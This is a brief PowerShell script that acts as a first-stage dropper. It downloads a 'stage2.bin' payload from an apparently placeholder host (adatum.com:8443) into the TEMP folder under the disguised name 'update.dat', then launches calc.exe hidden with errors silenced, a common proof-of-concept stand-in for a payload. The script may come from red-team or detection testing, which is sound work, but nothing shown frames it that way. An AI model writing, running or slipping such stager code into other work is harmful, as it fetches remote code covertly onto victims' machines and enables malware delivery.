[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://adatum.com:8443/cdn/stage2.bin',
    [string]$DropPath = "$env:TEMP\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
